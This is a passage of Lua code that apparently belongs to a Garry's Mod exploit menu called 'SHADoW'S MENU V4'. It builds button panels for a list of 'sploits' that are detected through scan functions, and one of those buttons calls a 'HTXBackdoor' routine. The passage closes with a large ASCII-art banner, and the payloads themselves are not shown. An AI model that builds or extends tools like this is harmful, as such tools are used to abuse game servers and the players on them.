for _, tab in ipairs( t.functions ) do
if tab.typ == "func" then
x = (x + 5) + iZNX.MakeFunctionButton( cmdp, x, 42, tab.name, tab.func )
elseif tab.typ == "players" then
x = (x + 5) + iZNX.MakePlayerSelectionButton( cmdp, x, 42, tab.addr )
elseif tab.typ == "htxcommandeliste" then
x = (x + 5) + iZNX.HTXBackdoor( cmdp, x, 42, tab.name )
elseif tab.typ == "string" then
x = (x + 5) + iZNX.MakeTextInputButton( cmdp, x, 42, tab.name, tab.default, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
elseif tab.typ == "float" then
x = (x + 5) + iZNX.MakeNumberInputButton( cmdp, x, 42, tab.name, tab.default, tab.min, tab.max, tab.addr )
if !iZNX.IsStored( tab.addr ) then iZNX.Store( tab.addr, tab.default ) end
end
end
Plist:AddItem( cmdp )
end
for k, v in pairs( iZNX.sploits ) do
if v.scan() then CreateSploitPanel( k, v ) end
end
else
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
return end
end)
 
MsgC (Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[                                          `-.`'.-'
                                       `-.        .-'.
                                    `-.    -./\.-    .-'
                                        -.  /_|\  .-
                                    `-.   `/____\'   .-'.
                                 `-.    -./.-""-.\.-      '
                                    `-.  /< (()) >\  .-'
                                  -   .`/__`-..-'__\'   .-
                                ,...`-./___|____|___\.-'.,.
                                   ,-'   ,` . . ',   `-,
                                ,-'   ________________  `-,
                                   ,'/____|_____|_____\
                                  / /__|_____|_____|___\
                                 / /|_____|_____|_____|_\
                                ' /____|_____|_____|_____\
                              .' /__|_____|_____|_____|___\
                             ,' /|_____|_____|_____|_____|_\
,,---''--...___...--'''--.. /../____|_____|_____|_____|_____\ ..--```--...___...--``---,,
                           '../__|_____|_____|_____|_____|___\
      \    )              '.:/|_____|_____|_____|_____|_____|_\               (    /
      )\  / )           ,':./____|_____|_____|_____|_____|_____\             ( \  /(
     / / ( (           /:../__|_____|_____|_____|_____|_____|___\             ) ) \ \
    | |   \ \         /.../|_____|_____|_____|_____|_____|_____|_\           / /   | |
 .-.\ \    \ \       '..:/____|_____|_____|_____|_____|_____|_____\         / /    / /.-.
(=  )\ `._.' |       \:./ _  _ ___  ____ ____ _    _ _ _ _ _  _ ___\        | `._.' /(  =)
 \ (_)       )       \./  |\/| |__) |___ |___ |___ _X_ _X_  \/  _|_ \       (       (_) /
  \    `----'         """"""""""""""""""""""""""""""""""""""""""""""""]])

    end --fin du SHADoW'S MENU V4